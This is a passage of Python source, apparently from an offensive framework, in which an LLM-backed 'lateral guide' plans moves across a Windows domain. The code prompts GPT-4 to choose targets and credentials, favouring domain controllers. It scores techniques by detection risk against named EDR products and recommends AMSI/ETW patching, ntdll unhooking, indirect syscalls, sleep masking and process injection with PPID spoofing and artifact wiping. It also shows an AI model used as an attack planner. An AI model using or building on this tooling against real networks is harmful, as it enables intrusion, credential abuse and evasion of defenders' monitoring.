- syscall_risk: LOW/MEDIUM/HIGH/CRITICAL
- edr_considerations: array of EDR evasion notes
- recommended_syscall_technique: hells_gate/halos_gate/syswhispers3/lotl
"""
        
        try:
            response = self._query_llm(prompt)
            path = json.loads(response)
            
            # Enhance with programmatic risk analysis
            if include_syscall_risk:
                path = self._add_syscall_risk_to_path(path)
            
            return path
        except Exception:
            path = self._simple_path(start, goal)
            if include_syscall_risk:
                path = self._add_syscall_risk_to_path(path)
            return path
    
    def _add_syscall_risk_to_path(self, path: List[Dict]) -> List[Dict]:
        """Add syscall detection risk analysis to each path step"""
        
        # Syscall risk mapping for different techniques
        syscall_risk_map = {
            # Low risk - LOTL / minimal syscalls
            "wmi": {"risk": "LOW", "score": 0.15, "syscalls_needed": ["NtOpenProcess"]},
            "wmiexec": {"risk": "LOW", "score": 0.15, "syscalls_needed": ["NtOpenProcess"]},
            "psremoting": {"risk": "LOW", "score": 0.1, "syscalls_needed": []},
            "winrm": {"risk": "LOW", "score": 0.1, "syscalls_needed": []},
            "dcom": {"risk": "LOW", "score": 0.2, "syscalls_needed": ["NtOpenProcess"]},
            "mshta": {"risk": "LOW", "score": 0.2, "syscalls_needed": []},
            
            # Medium risk - standard lateral movement
            "psexec": {"risk": "MEDIUM", "score": 0.35, "syscalls_needed": ["NtCreateFile", "NtWriteFile", "NtCreateThreadEx"]},
            "smbexec": {"risk": "MEDIUM", "score": 0.3, "syscalls_needed": ["NtCreateFile"]},
            "atexec": {"risk": "MEDIUM", "score": 0.25, "syscalls_needed": []},
            "schtaskexec": {"risk": "MEDIUM", "score": 0.25, "syscalls_needed": []},
            
            # High risk - process injection
            "process_hollow": {"risk": "HIGH", "score": 0.6, "syscalls_needed": [
                "NtCreateProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
                "NtSetContextThread", "NtResumeThread"
            ]},
            "dll_injection": {"risk": "HIGH", "score": 0.55, "syscalls_needed": [
                "NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
                "NtCreateThreadEx"
            ]},
            "thread_hijack": {"risk": "HIGH", "score": 0.65, "syscalls_needed": [
                "NtOpenProcess", "NtOpenThread", "NtSuspendThread",
                "NtSetContextThread", "NtResumeThread"
            ]},
            
            # Critical risk - direct shellcode execution
            "shellcode_inject": {"risk": "CRITICAL", "score": 0.8, "syscalls_needed": [
                "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
                "NtProtectVirtualMemory", "NtCreateThreadEx"
            ]},
            "apc_injection": {"risk": "CRITICAL", "score": 0.75, "syscalls_needed": [
                "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
                "NtQueueApcThread"
            ]},
        }
        
        for step in path:
            method = step.get('method', '').lower()
            
            # Get risk info or default to medium
            risk_info = syscall_risk_map.get(method, {
                "risk": "MEDIUM",
                "score": 0.4,
                "syscalls_needed": []
            })
            
            # Add syscall risk information
            step['syscall_detection'] = {
                'risk_level': risk_info['risk'],
                'risk_score': risk_info['score'],
                'syscalls_needed': risk_info['syscalls_needed'],
                'edr_trigger_likelihood': self._calculate_edr_trigger(risk_info),
                'mitigation_recommendations': self._get_syscall_mitigations(risk_info['risk']),
            }
            
            # Recommend syscall technique based on risk
            if risk_info['risk'] in ['HIGH', 'CRITICAL']:
                step['recommended_syscall_config'] = {
                    'technique': 'syswhispers3',
                    'use_indirect': True,
                    'jit_resolve': True,
                    'add_jitter': True,
                    'obfuscation_level': 'aggressive' if risk_info['risk'] == 'CRITICAL' else 'standard',
                }
            elif risk_info['risk'] == 'MEDIUM':
                step['recommended_syscall_config'] = {
                    'technique': 'halos_gate',
                    'use_indirect': True,
                    'jit_resolve': True,
                    'add_jitter': False,
                    'obfuscation_level': 'standard',
                }
            else:
                step['recommended_syscall_config'] = {
                    'technique': 'direct',
                    'use_indirect': False,
                    'jit_resolve': False,
                    'add_jitter': False,
                    'obfuscation_level': 'minimal',
                }
        
        return path
    
    def _calculate_edr_trigger(self, risk_info: Dict) -> Dict:
        """Calculate EDR trigger likelihood for different EDR products"""
        base_score = risk_info['score']
        syscalls = risk_info['syscalls_needed']
        
        # EDR-specific sensitivity
        edr_sensitivity = {
            'crowdstrike': 0.9,    # Very sensitive to syscall patterns
            'defender_atp': 0.85,  # High sensitivity
            'sentinelone': 0.8,    # High sensitivity
            'carbon_black': 0.75,  # Medium-high
            'elastic_edr': 0.7,    # Medium
            'sysmon': 0.6,         # Medium (requires config)
        }
        
        triggers = {}
        for edr, sensitivity in edr_sensitivity.items():
            # Higher sensitivity = more likely to trigger
            trigger_chance = min(base_score * sensitivity, 0.95)
            
            # Specific syscall detection
            high_risk_syscalls = ['NtAllocateVirtualMemory', 'NtWriteVirtualMemory', 
                                  'NtCreateThreadEx', 'NtQueueApcThread']
            for sc in syscalls:
                if sc in high_risk_syscalls:
                    trigger_chance = min(trigger_chance + 0.1, 0.95)
            
            triggers[edr] = round(trigger_chance, 2)
        
        return triggers
    
    def _get_syscall_mitigations(self, risk_level: str) -> List[str]:
        """Get mitigation recommendations based on risk level"""
        mitigations = {
            'LOW': [
                "Standard OPSEC sufficient",
                "Consider timing-based evasion"
            ],
            'MEDIUM': [
                "Use indirect syscalls (Hell's Gate/Halo's Gate)",
                "Add execution jitter",
                "Obfuscate payload (standard level)"
            ],
            'HIGH': [
                "Use SysWhispers3 with indirect syscalls",
                "Map fresh ntdll copy to avoid hooks",
                "Use aggressive obfuscation",
                "Consider LOTL alternatives",
                "Add sleep masking between operations"
            ],
            'CRITICAL': [
                "Use maximum obfuscation (paranoid level)",
                "Implement sleep masking with Ekko/Foliage",
                "Map fresh ntdll and unhook",
                "Use indirect syscalls with JIT resolution",
                "Consider module stomping",
                "Implement hardware breakpoint evasion",
                "STRONGLY consider LOTL alternative"
            ]
        }
        return mitigations.get(risk_level, mitigations['MEDIUM'])
    
    def _build_analysis_context(self, current_host: str = None) -> Dict:
        """Build context for AI analysis"""
        
        # Categorize hosts
        compromised = [h for h, i in self.hosts.items() if i.compromised]
        uncompromised = [h for h, i in self.hosts.items() if not i.compromised]
        high_value = [h for h, i in self.hosts.items() if i.is_dc or i.is_admin_workstation]
        
        # Credential analysis
        domain_admin_creds = [c for c, i in self.credentials.items() if i.is_domain_admin]
        tested_creds = [(c, len(i.tested_hosts)) for c, i in self.credentials.items()]
        
        return {
            'current_host': current_host,
            'compromised_hosts': compromised,
            'uncompromised_hosts': uncompromised,
            'high_value_targets': high_value,
            'domain_admin_creds': domain_admin_creds,
            'total_hosts': len(self.hosts),
            'total_creds': len(self.credentials),
            'movement_count': len(self.movement_history)
        }
    
    def _build_suggestion_prompt(self, context: Dict) -> str:
        """Build prompt for next jump suggestion"""
        
        return f"""
You are an expert penetration tester analyzing a network for lateral movement.

CURRENT STATE:
- Current position: {context['current_host'] or 'Initial foothold'}
- Compromised hosts: {context['compromised_hosts']}
- Uncompromised targets: {context['uncompromised_hosts']}
- High-value targets: {context['high_value_targets']}
- Domain admin credentials available: {len(context['domain_admin_creds']) > 0}
- Total movements so far: {context['movement_count']}

HOST DETAILS:
{json.dumps({h: self._host_to_dict(i) for h, i in list(self.hosts.items())[:10]}, indent=2)}

CREDENTIAL DETAILS:
{json.dumps({c: {{**self._cred_to_dict(i), 'tested_hosts': i.tested_hosts}} for c, i in list(self.credentials.items())[:5]}, indent=2)}

Based on this state, suggest the next 3 best lateral movement targets.
For each suggestion, provide:
1. Target host
2. Recommended method (wmiexec, psexec, smbexec, dcomexec)
3. Which credential to use
4. Confidence score (0-1)
5. Reasoning
6. Risk level (low/medium/high)
7. Expected value (low/medium/high/critical)

Prioritize:
- Untested credential/host combinations
- High-value targets (DCs, admin workstations)
- Stealth (prefer wmiexec over psexec when possible)
- Credential expansion (hosts that may have new credentials)

Return as JSON array.
"""
    
    def _query_llm(self, prompt: str) -> str:
        """Query the LLM engine"""
        if self.llm_engine:
            return self.llm_engine.generate(prompt)
        
        # Fallback: Use direct OpenAI API if available
        if self.api_key:
            import openai
            openai.api_key = self.api_key
            
            response = openai.ChatCompletion.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are an expert penetration testing AI assistant."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=2000
            )
            return response.choices[0].message.content
        
        raise Exception("No LLM available")
    
    def _parse_suggestions(self, response: str) -> List[JumpSuggestion]:
        """Parse LLM response into JumpSuggestion objects"""
        suggestions = []
        
        try:
            # Try to extract JSON from response
            import re
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                data = json.loads(json_match.group())
                
                for item in data:
                    suggestions.append(JumpSuggestion(
                        target=item.get('target', ''),
                        method=item.get('method', 'wmiexec'),
                        credentials=item.get('credential', ''),
                        confidence=float(item.get('confidence', 0.5)),
                        reasoning=item.get('reasoning', ''),
                        risk_level=item.get('risk_level', 'medium'),
                        expected_value=item.get('expected_value', 'medium'),
                        prerequisites=item.get('prerequisites', [])
                    ))
        except Exception as e:
            self._log(f"Failed to parse suggestions: {e}")
        
        return suggestions
    
    def _rule_based_suggestions(self, current_host: str = None) -> List[JumpSuggestion]:
        """Generate suggestions using rule-based logic with evasion scoring"""
        suggestions = []
        
        # Priority 1: Domain Controllers (if we have domain admin creds)
        domain_admin_creds = [c for c, i in self.credentials.items() if i.is_domain_admin]
        dcs = [h for h, i in self.hosts.items() if i.is_dc and not i.compromised]
        
        if domain_admin_creds and dcs:
            for dc in dcs[:2]:
                # Get evasion recommendation for DC
                profile, profile_info = self.recommend_evasion_for_jump(dc)
                
                suggestions.append(JumpSuggestion(
                    target=dc,
                    method='wmiexec',
                    credentials=domain_admin_creds[0],
                    confidence=0.85,
                    reasoning='Domain Controller with domain admin credentials',
                    risk_level='high',
                    expected_value='critical',
                    # Evasion scoring
                    recommended_profile=profile,
                    detection_risk=profile_info.get('detection_risk', 0.3),
                    speed_impact='very_slow' if profile == 'paranoid' else 'slow',
                    evasion_notes=[
                        f"Önerilen profil: {profile.upper()}",
                        profile_info.get('reason', ''),
                        f"Tespit riski: {profile_info.get('detection_risk_percent', '30%')}",
                        "DC için maksimum gizlilik önerilir"
                    ]
                ))
        
        # Priority 2: Admin workstations (for credential harvesting)
        admin_ws = [h for h, i in self.hosts.items() 
                   if i.is_admin_workstation and not i.compromised]
        
        for ws in admin_ws[:2]:
            best_cred = self._find_best_credential_for_host(ws)
            if best_cred:
                profile, profile_info = self.recommend_evasion_for_jump(ws)
                
                suggestions.append(JumpSuggestion(
                    target=ws,
                    method='wmiexec',
                    credentials=best_cred,
                    confidence=0.7,
                    reasoning='Admin workstation - likely has cached credentials',
                    risk_level='medium',
                    expected_value='high',
                    recommended_profile=profile,
                    detection_risk=profile_info.get('detection_risk', 0.4),
                    speed_impact='slow' if profile in ['paranoid', 'stealth'] else 'moderate',
                    evasion_notes=[
                        f"Önerilen profil: {profile.upper()}",
                        "Admin WS - credential harvesting potansiyeli yüksek"
                    ]
                ))
        
        # Priority 3: Any uncompromised host with untested credentials
        for hostname, host in self.hosts.items():
            if host.compromised:
                continue
            
            for cred_name, cred in self.credentials.items():
                if hostname not in cred.tested_hosts:
                    profile, profile_info = self.recommend_evasion_for_jump(hostname)
                    
                    suggestions.append(JumpSuggestion(
                        target=hostname,
                        method='wmiexec',
                        credentials=cred_name,
                        confidence=0.5,
                        reasoning='Untested credential/host combination',
                        risk_level='low',
                        expected_value='medium',
                        recommended_profile=profile,
                        detection_risk=profile_info.get('detection_risk', 0.5),
                        speed_impact='moderate',
                        evasion_notes=[f"Önerilen profil: {profile.upper()}"]
                    ))
                    break
            
            if len(suggestions) >= 5:
                break
        
        # Sort by confidence
        suggestions.sort(key=lambda x: x.confidence, reverse=True)
        return suggestions[:5]
    
    def _find_best_credential_for_host(self, hostname: str) -> Optional[str]:
        """Find the best credential to use for a host"""
        
        # Prefer credentials that have worked on similar hosts
        for cred_name, cred in self.credentials.items():
            if cred.is_domain_admin:
                return cred_name
        
        # Fall back to any credential
        if self.credentials:
            return list(self.credentials.keys())[0]
        
        return None
    
    def _simple_path(self, start: str, goal: str) -> List[Dict]:
        """Generate a simple path without AI"""
        return [
            {'target': start, 'method': 'initial', 'credential': '', 'reasoning': 'Starting point'},
            {'target': goal, 'method': 'wmiexec', 'credential': 'domain_admin', 'reasoning': 'Direct path to goal'}
        ]
    
    def _host_to_dict(self, host: HostIntel) -> Dict:
        """Convert HostIntel to dict for JSON serialization"""
        return {
            'hostname': host.hostname,
            'ip': host.ip,
            'compromised': host.compromised,
            'is_dc': host.is_dc,
            'is_admin_ws': host.is_admin_workstation,
            'av': host.av_product,
            'services': host.services[:5] if host.services else []
        }
    
    def _cred_to_dict(self, cred: CredentialIntel) -> Dict:
        """Convert CredentialIntel to dict for JSON serialization"""
        return {
            'username': cred.username,
            'domain': cred.domain,
            'type': cred.cred_type,
            'is_domain_admin': cred.is_domain_admin,
            'successful_hosts': cred.successful_hosts
        }
    
    def _log(self, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, "AI_LATERAL_GUIDE", message)
        print(f"[AI_LATERAL] {message}")
    
    def export_to_vr(self, export_format: str = "webxr", output_dir: str = None) -> Optional[str]:
        """
        Export movement history to VR/AR visualization
        
        Args:
            export_format: webxr, unity, threejs, json, gltf
            output_dir: Output directory for VR files
            
        Returns:
            Path to exported VR scene or None if VR module not available
        """
        if not HAS_VR_VIZ:
            self._log("VR Viz module not available")
            return None
        
        try:
            # Convert movement history to chain log format
            chain_log = []
            for move in self.movement_history:
                chain_log.append({
                    "target": move.get("target", "unknown"),
                    "action": f"{move.get('method', 'Unknown')} via {move.get('credential', 'N/A')}",
                    "result": "success" if move.get("success") else "failed",
                    "severity": "critical" if "admin" in move.get("credential", "").lower() else "high",
                    "source": move.get("source", "attacker"),
                    "timestamp": move.get("timestamp")
                })
            
            if not chain_log:
                self._log("No movement history to export")
                return None
            
            # Create VR viz instance
            config = {"output_dir": output_dir or "./vr_output"}
            vr = VRViz(config)
            
            # Generate scene
            vr.generate_from_chain_log(chain_log)
            
            # Export
            format_map = {
                "webxr": VRExportFormat.WEBXR,
                "unity": VRExportFormat.UNITY_SCENE,
                "threejs": VRExportFormat.THREE_JS,
                "json": VRExportFormat.JSON_SCENE,
                "gltf": VRExportFormat.GLTF
            }
            
            export_fmt = format_map.get(export_format.lower(), VRExportFormat.WEBXR)
            output_path = vr.export_scene(export_fmt)
            
            self._log(f"Exported VR scene to: {output_path}")
            return output_path
            
        except Exception as e:
            self._log(f"VR export error: {e}")
            return None
    
    def get_summary(self) -> Dict:
        """Get summary of current state"""
        return {
            'total_hosts': len(self.hosts),
            'compromised_hosts': sum(1 for h in self.hosts.values() if h.compromised),
            'total_credentials': len(self.credentials),
            'domain_admin_creds': sum(1 for c in self.credentials.values() if c.is_domain_admin),
            'total_movements': len(self.movement_history),
            'successful_movements': sum(1 for m in self.movement_history if m['success']),
            'dcs_compromised': sum(1 for h in self.hosts.values() if h.is_dc and h.compromised)
        }    
    def auto_select_bypass(self, target: str = None) -> Dict[str, Any]:
        """
        Otomatik bypass layer seçimi
        
        Hedef savunmaları analiz eder ve en uygun bypass layer'ı seçer
        
        Returns:
            Dict: {
                'selected_layer': 'none|amsi|etw|both',
                'reasoning': str,
                'risk_reduction': float,
                'speed_impact': str
            }
        """
        result = {
            'selected_layer': 'both',
            'reasoning': 'Default: hem AMSI hem ETW bypass',
            'risk_reduction': 0.4,
            'speed_impact': 'moderate'
        }
        
        # Host intel varsa ona göre karar ver
        if target and target in self.hosts:
            host = self.hosts[target]
            
            if not host.av_product:
                result['selected_layer'] = 'none'
                result['reasoning'] = 'AV/EDR tespit edilmedi'
                result['risk_reduction'] = 0.0
                result['speed_impact'] = 'fast'
            elif 'defender' in host.av_product.lower():
                result['selected_layer'] = 'amsi'
                result['reasoning'] = 'Windows Defender: sadece AMSI bypass yeterli'
                result['risk_reduction'] = 0.3
                result['speed_impact'] = 'fast'
            elif any(edr in host.av_product.lower() for edr in ['crowdstrike', 'sentinelone', 'carbonblack']):
                result['selected_layer'] = 'both'
                result['reasoning'] = f'Advanced EDR ({host.av_product}): full bypass gerekli'
                result['risk_reduction'] = 0.6
                result['speed_impact'] = 'slow'
        
        # Live scan yapılabiliyorsa
        if HAS_BYPASS_ANALYZER:
            try:
                analyzer = DefenseAnalyzer()
                analysis = analyzer.analyze_defenses()
                result['selected_layer'] = analysis.recommended_bypass.value
                result['live_risk_score'] = analysis.risk_score
                result['amsi_present'] = analysis.amsi_present
                result['etw_enabled'] = analysis.etw_enabled
                result['edr_detected'] = analysis.edr_detected
            except Exception:
                pass
        
        return result
    
    def get_bypass_recommendations_for_jump(self, target: str, method: str) -> Dict[str, Any]:
        """
        Belirli bir lateral movement jump'ı için bypass önerileri
        
        Args:
            target: Hedef hostname
            method: wmiexec, psexec, smbexec, etc.
        
        Returns:
            Dict: Bypass önerileri ve konfigürasyonu
        """
        recommendations = {
            'target': target,
            'method': method,
            'pre_jump_bypass': [],
            'post_jump_cleanup': [],
            'evasion_config': {}
        }
        
        # Method'a göre özel bypass
        method_bypass_map = {
            'wmiexec': {
                'amsi': True,
                'etw': True,
                'reason': 'WMI ETW provider aktif olabilir'
            },
            'psexec': {
                'amsi': False,
                'etw': True,
                'reason': 'Service creation ETW log üretir'
            },
            'smbexec': {
                'amsi': False,
                'etw': True,
                'reason': 'SMB/cmd execution traces'
            },
            'atexec': {
                'amsi': False,
                'etw': False,
                'reason': 'Scheduled task - minimal logging'
            },
            'dcomexec': {
                'amsi': True,
                'etw': True,
                'reason': 'DCOM generates AMSI events'
            },
            'powershell': {
                'amsi': True,
                'etw': True,
                'reason': 'PowerShell AMSI + ScriptBlock logging'
            }
        }
        
        method_config = method_bypass_map.get(method, {'amsi': True, 'etw': True, 'reason': 'Default'})
        
        if method_config['amsi']:
            recommendations['pre_jump_bypass'].append({
                'type': 'amsi',
                'technique': 'patch_amsi_scan_buffer',
                'priority': 1
            })
        
        if method_config['etw']:
            recommendations['pre_jump_bypass'].append({
                'type': 'etw',
                'technique': 'patch_etw_event_write',
                'priority': 2
            })
        
        # Host intel'e göre ekstra bypass
        if target in self.hosts:
            host = self.hosts[target]
            if host.av_product and any(edr in host.av_product.lower() for edr in ['crowdstrike', 'sentinelone']):
                recommendations['pre_jump_bypass'].append({
                    'type': 'unhook',
                    'technique': 'unhook_ntdll',
                    'priority': 0  # İlk yapılmalı
                })
        
        # Sort by priority
        recommendations['pre_jump_bypass'].sort(key=lambda x: x.get('priority', 99))
        
        # Cleanup önerileri
        recommendations['post_jump_cleanup'] = [
            {'action': 'restore_amsi', 'reason': 'OPSEC - restore original state'},
            {'action': 'restore_etw', 'reason': 'OPSEC - prevent future alerts'}
        ]
        
        return recommendations

    def get_sleepmask_cloaking_recommendation(self, target: str = None) -> Dict[str, Any]:
        """
        Get AI-guided sleepmask cloaking recommendation.
        
        Args:
            target: Target host for context (optional)
        
        Returns:
            Dict with cloaking recommendations based on detected EDR
        """
        result = {
            'available': HAS_SLEEPMASK_CLOAKING,
            'recommendation': '',
            'cloak_level': 'ELITE',
            'detected_edr': 'none',
            'strategy': {},
            'heap_spoof': True,
            'artifact_wipe': True,
            'rop_enabled': True,
            'techniques': []
        }
        
        if not HAS_SLEEPMASK_CLOAKING:
            result['recommendation'] = 'Sleepmask cloaking module not available'
            return result
        
        try:
            # Initialize AI selector
            selector = AICloakSelector()
            detected_edr = selector.detect_edr()
            
            # Get strategy
            strategy = selector.select_strategy()
            
            result['detected_edr'] = detected_edr.value
            result['cloak_level'] = strategy['cloak_level'].name
            result['strategy'] = {
                'gadget_density': strategy['gadget_density'],
                'entropy_target': strategy['entropy_target'],
                'heap_spoof': strategy['heap_spoof'],
                'artifact_wipe': strategy['artifact_wipe'],
                'mask_interval': strategy['timing']['mask_interval'],
                'jitter_percent': strategy['timing']['jitter_percent']
            }
            result['techniques'] = strategy['techniques']
            result['heap_spoof'] = strategy['heap_spoof']
            result['recommendation'] = selector.get_recommendation()
            
            # Host-specific adjustments
            if target and target in self.hosts:
                host = self.hosts[target]
                if host.av_product:
                    av_lower = host.av_product.lower()
                    
                    # Adjust based on specific EDR
                    if 'crowdstrike' in av_lower or 'falcon' in av_lower:
                        result['cloak_level'] = 'ELITE'
                        result['techniques'].append('kernel_callback_evasion')
                        result['rop_enabled'] = True
                    
                    elif 'sentinelone' in av_lower:
                        result['cloak_level'] = 'ELITE'
                        result['strategy']['gadget_density'] = 0.7
                        result['techniques'].append('stack_spoof')
                    
                    elif 'defender' in av_lower:
                        result['cloak_level'] = 'ADVANCED'
                        result['strategy']['entropy_target'] = 6.5
            
            self._log(f"Sleepmask recommendation: {result['cloak_level']} for {result['detected_edr']}")
            
        except Exception as e:
            result['error'] = str(e)
            result['recommendation'] = f'Error generating recommendation: {e}'
        
        return result
    
    def create_cloaking_engine(
        self,
        target: str = None,
        auto_detect: bool = True
    ):
        """
        Create a SleepmaskCloakingEngine with AI-recommended settings.
        
        Args:
            target: Target host for context
            auto_detect: Auto-detect EDR
        
        Returns:
            Configured SleepmaskCloakingEngine instance or None
        """
        if not HAS_SLEEPMASK_CLOAKING:
            self._log("Sleepmask cloaking not available")
            return None
        
        try:
            # Get recommendation
            rec = self.get_sleepmask_cloaking_recommendation(target)
            
            # Parse cloak level
            level_map = {
                'NONE': CloakLevel.NONE,
                'BASIC': CloakLevel.BASIC,
                'STANDARD': CloakLevel.STANDARD,
                'ADVANCED': CloakLevel.ADVANCED,
                'ELITE': CloakLevel.ELITE,
                'PARANOID': CloakLevel.PARANOID
            }
            cloak_level = level_map.get(rec['cloak_level'], CloakLevel.ELITE)
            
            # Create engine
            engine = SleepmaskCloakingEngine(
                auto_detect_edr=auto_detect,
                cloak_level=cloak_level,
                enable_heap_spoof=rec['heap_spoof'],
                enable_artifact_wipe=rec.get('artifact_wipe', True),
                enable_rop=rec['rop_enabled']
            )
            
            self._log(f"Created cloaking engine: level={cloak_level.name}")
            return engine
            
        except Exception as e:
            self._log(f"Failed to create cloaking engine: {e}")
            return None
    
    # ============================================================
    # PROCESS INJECTION MASTERCLASS INTEGRATION
    # ============================================================
    
    def get_injection_recommendation(self, target: str = None) -> Dict[str, Any]:
        """
        Get AI-guided injection technique recommendation.
        
        Analyzes target defenses and recommends optimal injection chain.
        
        Args:
            target: Target hostname (optional, for context)
        
        Returns:
            Dict with:
            - detected_edr: Primary EDR detected
            - primary_technique: Recommended injection technique
            - fallback_chain: Ordered list of fallback techniques
            - ppid_spoof_required: Whether PPID spoofing is needed
            - mutation_required: Whether PEB/TEB mutation is needed
            - artifact_wipe: Whether artifact wiping is needed
            - delay_ms: Recommended delay before injection
            - recommendation: Human-readable recommendation
        """
        result = {
            'detected_edr': 'None',
            'primary_technique': 'early_bird_apc',
            'fallback_chain': ['module_stomping', 'thread_hijack', 'classic_crt'],
            'ppid_spoof_required': True,
            'mutation_required': False,
            'artifact_wipe': True,
            'delay_ms': 1500,
            'use_syscalls': True,
            'recommendation': 'Default injection chain',
            'techniques_by_stealth': [],
            'error': None,
        }
        
        if not HAS_INJECTION_MASTERCLASS:
            result['error'] = 'Injection masterclass module not available'
            result['recommendation'] = 'Install process_injection_masterclass module'
            return result
        
        try:
            # Use AI selector
            selector = AIInjectionSelector()
            technique, profile_info = selector.detect_and_select()
            
            profile = profile_info.get('profile', {})
            edr = profile_info.get('edr', InjectionEDRProduct.NONE)
            
            result['detected_edr'] = profile.get('name', 'None')
            result['primary_technique'] = technique.value
            result['fallback_chain'] = [t.value for t in profile.get('fallback_chain', [])]
            result['ppid_spoof_required'] = profile.get('ppid_spoof_required', True)
            result['mutation_required'] = profile.get('mutation_required', False)
            result['artifact_wipe'] = profile.get('artifact_wipe', True)
            result['delay_ms'] = profile.get('delay_injection_ms', 1500)
            result['use_syscalls'] = profile.get('use_syscalls', True)
            result['recommendation'] = selector.get_recommendation()
            
            # Add target-specific adjustments
            if target and target in self.hosts:
                host = self.hosts[target]
                if host.is_dc:
                    result['ppid_spoof_required'] = True
                    result['mutation_required'] = True
                    result['artifact_wipe'] = True
                    result['delay_ms'] = max(result['delay_ms'], 3000)
                if host.av_product:
                    av_lower = host.av_product.lower()
                    if 'crowdstrike' in av_lower or 'sentinelone' in av_lower:
                        result['mutation_required'] = True
            
            self._log(f"Injection recommendation: {result['primary_technique']} for {result['detected_edr']}")
            
        except Exception as e:
            result['error'] = str(e)
            result['recommendation'] = f'Error: {e}'
        
        return result
    
    def create_injection_engine(
        self,
        target: str = None,
        ai_adaptive: bool = True,
        enable_ppid_spoof: bool = True,
        enable_mutation: bool = True,
        enable_artifact_wipe: bool = True
    ):
        """
        Create a ProcessInjectionMasterclass with AI-recommended settings.
        
        Args:
            target: Target host for context
            ai_adaptive: Use AI-adaptive technique selection
            enable_ppid_spoof: Enable PPID spoofing
            enable_mutation: Enable PEB/TEB mutation
            enable_artifact_wipe: Enable artifact wiping
        
        Returns:
            Configured ProcessInjectionMasterclass instance or None
        """
        if not HAS_INJECTION_MASTERCLASS:
            self._log("Injection masterclass not available")
            return None
        
        try:
            # Get recommendation for target-specific settings
            rec = self.get_injection_recommendation(target)
            
            # Override with recommendation if not explicitly set
            if rec.get('ppid_spoof_required'):
                enable_ppid_spoof = True
            if rec.get('mutation_required'):
                enable_mutation = True
            if rec.get('artifact_wipe'):
                enable_artifact_wipe = True
            
            # Create engine
            config = InjectionConfig(
                ai_adaptive=ai_adaptive,
                auto_detect_edr=ai_adaptive,
                enable_ppid_spoof=enable_ppid_spoof,
                enable_mutation=enable_mutation,
                enable_artifact_wipe=enable_artifact_wipe,
                delay_execution_ms=rec.get('delay_ms', 1500),
                use_syscalls=rec.get('use_syscalls', True),
            )
            
            engine = ProcessInjectionMasterclass(config)
            
            self._log(f"Created injection engine: ai_adaptive={ai_adaptive}, ppid_spoof={enable_ppid_spoof}")
            return engine
            
        except Exception as e:
            self._log(f"Failed to create injection engine: {e}")
            return None
    
    def recommend_injection_for_target(
        self,
        target: str,
        shellcode_size: int = 0,
        requires_pe: bool = False
    ) -> Dict[str, Any]:
        """
        Get target-specific injection recommendation.
        
        Considers host intel, EDR, and payload requirements.
        
        Args:
            target: Target hostname
            shellcode_size: Size of shellcode (affects technique selection)
            requires_pe: Whether payload requires PE execution
        
        Returns:
            Dict with technique recommendation and execution plan
        """
        result = {
            'target': target,
            'recommended_technique': 'early_bird_apc',
            'execution_plan': [],
            'opsec_requirements': [],
            'estimated_detection_risk': 0.5,
            'estimated_behavioral_score': 0.5,
            'notes': [],
        }
        
        # Get base recommendation
        base_rec = self.get_injection_recommendation(target)
        result['recommended_technique'] = base_rec['primary_technique']
        
        # Build execution plan
        execution_plan = [
            {'step': 1, 'action': 'Detect EDR', 'detail': f"Detected: {base_rec['detected_edr']}"},
            {'step': 2, 'action': 'PPID Spoof', 'detail': 'Spoof to explorer.exe' if base_rec['ppid_spoof_required'] else 'Skip'},
            {'step': 3, 'action': 'Delay', 'detail': f"Wait {base_rec['delay_ms']}ms"},
            {'step': 4, 'action': 'Inject', 'detail': f"Primary: {base_rec['primary_technique']}"},
            {'step': 5, 'action': 'Mutation', 'detail': 'Apply PEB/TEB mutation' if base_rec['mutation_required'] else 'Skip'},
            {'step': 6, 'action': 'Artifact Wipe', 'detail': 'Wipe process artifacts' if base_rec['artifact_wipe'] else 'Skip'},
        ]
        result['execution_plan'] = execution_plan
        
        # OPSEC requirements
        if base_rec['ppid_spoof_required']:
            result['opsec_requirements'].append('PPID spoofing required for process tree evasion')
        if base_rec['mutation_required']:
            result['opsec_requirements'].append('PEB/TEB mutation required for anti-forensics')
        if base_rec['use_syscalls']:
            result['opsec_requirements'].append('Direct syscalls for user-mode hook bypass')
        
        # Adjust for PE requirement
        if requires_pe:
            pe_techniques = ['ghosting', 'herpaderping', 'doppelganging', 'hollowing']
            if result['recommended_technique'] not in pe_techniques:
                result['recommended_technique'] = 'ghosting'
                result['notes'].append('Switched to ghosting for PE payload requirement')
        
        # Estimate detection risk
        technique_risk = {
            'ghosting': 0.05,
            'herpaderping': 0.05,
            'transacted_hollowing': 0.10,
            'doppelganging': 0.10,
            'syscall': 0.10,
            'module_stomping': 0.15,
            'early_bird_apc': 0.20,
            'phantom_dll': 0.20,
            'thread_hijack': 0.30,
            'hollowing': 0.35,
            'classic_crt': 0.80,
        }
        
        base_risk = technique_risk.get(result['recommended_technique'], 0.5)
        
        # Adjust for OPSEC measures
        if base_rec['ppid_spoof_required']:
            base_risk *= 0.8
        if base_rec['mutation_required']:
            base_risk *= 0.9
        if base_rec['artifact_wipe']:
            base_risk *= 0.9
        
        result['estimated_detection_risk'] = round(base_risk, 2)
        result['estimated_behavioral_score'] = round(base_risk, 2)
        
        return result
    
    # =========================================================================
    # SYSCALL OBFUSCATION GUIDANCE
    # =========================================================================
    
    def get_syscall_obfuscation_recommendation(self, target: str = None) -> Dict[str, Any]:
        """
        Get AI-guided syscall obfuscation recommendation.
        
        Analyzes target defenses and recommends optimal obfuscation layers.
        
        Args:
            target: Target hostname (optional, for context)
        
        Returns:
            Dict with:
            - detected_edr: Primary EDR detected
            - primary_layer: Recommended obfuscation layer
            - secondary_layers: Additional layers to apply
            - stub_pattern: Recommended stub pattern
            - mutation_rate: ML mutation rate
            - entropy_level: Target entropy level
            - spoof_calls: Recommended spoof calls
            - recommendation: Human-readable recommendation
        """
        result = {
            'detected_edr': 'None',
            'primary_layer': 'indirect_call',
            'secondary_layers': [],
            'stub_pattern': 'standard',
            'mutation_rate': 0.5,
            'entropy_level': 0.5,
            'junk_ratio': 0.3,
            'spoof_calls': [],
            'delay_range_ms': [10, 50],
            'use_fresh_ssn': True,
            'recommendation': 'Default syscall obfuscation',
            'error': None,
        }
        
        if not HAS_SYSCALL_OBFUSCATOR:
